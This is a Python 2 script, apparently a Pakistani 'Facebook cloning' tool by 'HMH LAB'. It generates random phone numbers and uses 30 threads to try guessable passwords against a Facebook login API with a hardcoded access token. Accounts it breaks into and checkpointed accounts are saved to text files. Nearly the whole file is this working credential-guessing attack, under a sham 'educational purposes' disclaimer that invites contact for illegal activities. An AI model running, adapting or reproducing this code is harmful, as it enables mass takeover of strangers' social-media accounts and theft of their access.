#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To HMH LAB
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(4000):

    nmbr = random.randint(0000000, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 ok.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
cookies = mechanize.CookieJar()
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Mozilla/5.0 (Linux; Android 10; LM-X520 Build/QKQ1.200531.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/354.0.0.22.110;]')]
br.addheaders = [('user-agent','Dalvik/2.1.0 (Linux; U; Android 7.0; SAMSUNG-SM-G935A Build/NRD90M)')]
br.addheaders = [('user-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.0.1) Gecko/20020826')]
br.addheaders = [('user-agent','Mozilla/5.0 (Windows; U; Windows NT 6.1; chrome://navigator/locale/navigator.properties; rv:1.8.0.1) Gecko/20060126')]
def keluar():
	print ('Subscribe To HM VIDs')
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:HMH TECH
##### LOGO #####
logo = """
\033[1;91m   =============================================
\033[1;36;40m     █████████████████\033[1;30;46m████████████████████████
\033[1;36;40m     █─█─█▄─▀█▀─▄█─█─█\033[1;30;46m██─▄─▄─█▄─▄▄─█─▄▄▄─█─█─█
\033[1;36;40m     █─▄─██─█▄█─██─▄─█\033[1;30;46m████─████─▄█▀█─███▀█─▄─█
\033[1;36;40m     ▀▄▀▄▀▄▄▄▀▄▄▄▀▄▀▄▀\033[1;30;46m▀▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▀▄▀
\033[1;37;40m   =============================================
\033[1;32m           @\033[1;93m  WhatsApp NO : \033[1;93m+923189392092
\033[1;97m       *************************************
\033[1;93m        Blog : Https://hmhweb.blogspot.com
\033[1;97m       *************************************
\033[1;93m             FACEBOOK   : hammas.hmh
\033[1;97m       *************************************"""
logo2 = """
\033[1;32m                        
    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄ 
   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
   ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▐░▌ 
   ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌  
   ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌░▌   
   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌    
   ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   
   ▐░▌          ▐░▌       ▐░▌▐░▌▐░▌  
   ▐░▌          ▐░▌       ▐░▌▐░▌ ▐░▌ 
   ▐░▌          ▐░▌       ▐░▌▐░▌  ▐░▌
    ▀            ▀         ▀  ▀    ▀ \033[1;37;40m"""
logo3 = """
\033[1;91m   =============================================
\033[1;36;40m     █████████████████\033[1;30;46m████████████████████████
\033[1;36;40m     █─█─█▄─▀█▀─▄█─█─█\033[1;30;46m██─▄─▄─█▄─▄▄─█─▄▄▄─█─█─█
\033[1;36;40m     █─▄─██─█▄█─██─▄─█\033[1;30;46m████─████─▄█▀█─███▀█─▄─█
\033[1;36;40m     ▀▄▀▄▀▄▄▄▀▄▄▄▀▄▀▄▀\033[1;30;46m▀▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▀▄▀
\033[1;37;40m   =============================================   """
logo1 = """
\033[1;96m
    __  _____    __  _____  ______   _____
   / / / /   |  /  |/  /  |/  /   | / ___/
  / /_/ / /| | / /|_/ / /|_/ / /| | \__ \ 
 / __  / ___ |/ /  / / /  / / ___ |___/ / 
/_/ /_/_/  |_/_/  /_/_/  /_/_/  |_/____/  
                                          
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = [] 
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print logo
print "==========================="
CorrectUsername = "Hammas"
CorrectPassword = "King"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m=> \x1b[1;36;40mTool Username \x1b[1;97m=> \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m=> \x1b[1;36;40mTool Password  \x1b[1;97m=> \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:HMH TECH
	    time.sleep (1)#(2)#
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://hmhweb.blogspot.com')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://hmhweb.blogspot.com')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo3
        print "\033[1;95m«-----------------\033[1;91mDisclaimer\033[1;95m---------------»"
        time.sleep(0.05)
        print "\033[1;33mThis Tool is For Educational Purpose   "
        time.sleep(0.05)
        print "\033[1;33mpurposes ONLY.How you use this information"
        time.sleep(0.05)
        print "\033[1;33mheld accountable. This Tool/Channel Doesn't"
        time.sleep(0.05)
        print "\033[1;33mSupport illegal activities.For any illegal"
        time.sleep(0.05)
        print "\033[1;33mActivities Contact me Via WhatsApp \033[1;92m@."
        time.sleep(0.05)
        print "\033[1;96m_________________________________________________"
        time.sleep(0.05)
        print "\033[1;93m 1.\033[1;37;40m Fast Cloning Without Fb ID\033[1;92m [Updated]|"
        time.sleep(0.05)
        print "\033[1;96m_________________________________________________"
        time.sleep(0.05)
        print "\033[1;93m 2.\033[1;37;40m HMH Tech Blog   |"
        time.sleep(0.05)
        print "\033[1;96m_________________________________________________"
        time.sleep(0.05)
        print "\033[1;93m 3.\033[1;37;40m HMH Tech  Youtube Channel  | "
        time.sleep(0.05)
        print "\033[1;96m_________________________________________________"
        time.sleep(0.05)
	print "\033[1;91m0.\033[1;91m Exit             "
	action()

def action():
	Nohmh = raw_input('\033[1;37;41mChoose an Option \033[1;37;40m : \033[1;37m')
	if Nohmh =='':
		print '[!] Fill in correctly'
		action()
        elif Nohmh =="1":
                os.system('cd /sdcard && python2 bar2.py')
		os.system("clear")
		print (logo2)
		print("        www.facebook.com/hammas.hmh")
		print("\033[1;93m|===========================================|")
		print("\033[1;37m|    Jazz   = 00,01,02,03,04,05,06,07,08,09 |")
		print("| Zong    = 10,11,12,13,14,15,16,17,18,19   |")  
		print("|   Warid   = 20,21,22,23,24,25,26,27,28,29 |")  
		print("| Ufone   = 30,31,32,33,34,35,36,37,38,39   |")  
		print("|   Telenor = 40,41,42,43,44,45,46,47,48,49 |")    
		print("\033[1;93m|===========================================|")
		try:
			c = raw_input("\033[1;37;41m=> Enter Code   \033[1;37;40m : ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			Nohmh()
        elif Nohmh =="2":
				os.system('xdg-open https://hmhweb.blogspot.com')
				login()
        elif Nohmh =="3":
					os.system('xdg-open https://www.youtube.com/channel/UCt5lYc61toReV3CFpQwb1ZA?sub_confirmation=1')
					login()
	elif Nohmh =='0':
		login()
	else:
		print '[!] Fill in correctly'
		action()

	xxx = str(len(id))
	jalan ('[!] Total Numbers: '+xxx)
	time.sleep(0.05)
	jalan(' Plz Wait Cloned Accounts Will Appear Here')
	time.sleep(0.05)
	jalan ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.05)
	print 44*'-'
	print ('\033[1;37;40m              ===Getting Idz===\n')
	print(" |      Email     |   PASSWORD")
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '{ONE TAP}  ' + k + c + user + '  |  ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'  |  ' +pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
 				if 'www.facebook.com' in q['error_msg']:
					print '[CP] ' + k + c + user + '  |  ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+ '  |  '+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:
					pass2= k+c+user
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
					q = json.load(data)
					if 'access_token' in q:
						print '{ONE TAP}  ' + k + c + user + '  |  ' + pass2+'\n'+"\n"
						okb = open('save/successfull.txt', 'a')
						okb.write(k+c+user+'  »  '+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
				  	else:
							if 'www.facebook.com' in q['error_msg']:
								print '[CP] ' + k + c + user + '  |  ' + pass2+'\n'
								cps = open('save/checkpoint.txt', 'a')
								cps.write(k+c+user+'  |  '+pass2+'\n')
								cps.close()
								cpb.append(c+user+pass2)
							else:
								pass3="pakistan"
								data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
								q = json.load(data)
								if 'access_token' in q:
									print '{ONE TAP}  ' + k + c + user + '  |  ' + pass3+'\n'+"\n"
									okb = open('save/successfull.txt', 'a')
									okb.write(k+c+user+'  |  '+pass3+'\n')
									okb.close()
									oks.append(c+user+pass3)
							  	else:
										if 'www.facebook.com' in q['error_msg']:
											print '[CP] ' + k + c + user + '  |  ' + pass3+'\n'
											cps = open('save/checkpoint.txt', 'a')
											cps.write(k+c+user+'  |  '+pass3+'\n')
											cps.close()
											cpb.append(c+user+pass3)


		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	print '[?] Process Has Been Completed ....'
	print '[?] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[?] CP File Has Been Saved : save/checkpoint.txt')
	print """
 \033[1;96mDon't Worry Your CheckPoint ID Will Be Open After 7 DAYS"""

	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	login()	
          
if __name__ == '__main__':
	login()
	
